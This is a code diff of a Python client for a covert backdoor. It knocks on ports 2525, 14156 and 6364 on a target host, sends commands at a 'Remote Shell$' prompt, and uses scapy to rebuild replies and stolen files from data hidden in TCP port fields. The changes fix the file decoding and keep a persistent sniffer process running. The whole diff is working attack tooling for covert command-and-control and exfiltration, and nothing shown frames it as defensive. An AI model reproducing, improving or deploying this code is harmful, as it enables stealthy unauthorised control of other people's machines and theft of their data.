@@ -34,7 +34,8 @@ def verify_root():
 
 def binary_to_file(binary):
 	string = ''.join(binary)
-	decrypted =  decrypt_val(string)
+	decrypted = decrypt_val(string)
+	decrypted = binascii.unhexlify('%x' % int(decrypted, 2))
 	filename, data = decrypted.split('\0', 1)
 	data = data.rstrip('\0').rstrip('\n')
 	with open(filename, "wb") as f:
@@ -94,20 +95,17 @@ def get_result(packet):
 		result = ''.join(OUTPUT[sport])
 		print(decrypt_val(result))
 		OUTPUT[sport] = ""
-		return True
 	elif(packet[1].id == 41414):
 		binary_to_file(OUTPUT[sport])
 		OUTPUT[sport] = ""
-		return True
 	else:
 		dport = packet[2].dport
 		char1 = chr((dport >> 8) & 0xff)
 		char2 = chr(dport & 0xff)
 		if(char2 is not None):
-			OUTPUT[sport].append("{}{}".format(char1, char2))
+			OUTPUT[sport] += "{}{}".format(char1, char2)
 		else:
-			OUTPUT[sport].append("{}".format(char1))
-		return False
+			OUTPUT[sport] += "{}".format(char1)
 
 
 def send_cmd(msg):
@@ -123,7 +121,7 @@ def send_cmd(msg):
 
 
 def scapySniff():
-	sniff(filter="tcp and src {}".format(args.destIP), stop_filter=get_result)
+	sniff(filter="tcp and src {}".format(args.destIP), prn=get_result)
 
 
 def main():
@@ -131,12 +129,12 @@ def main():
 	ports = [2525, 14156, 6364]
 	knock(args.destIP, ports)
 
+	sniffProc = Process(target=scapySniff)
+	sniffProc.daemon = True
+	sniffProc.start()
 	while True:
-		msg = raw_input('Send: ')
+		msg = raw_input('[{}] Remote Shell$ '.format(args.destIP))
 		send_cmd(msg)
-		sniffProc = Process(target=scapySniff)
-		sniffProc.daemon = True
-		sniffProc.start()
 		# sniff(filter="tcp and src {}".format(args.destIP), stop_filter=get_result)
 		
 
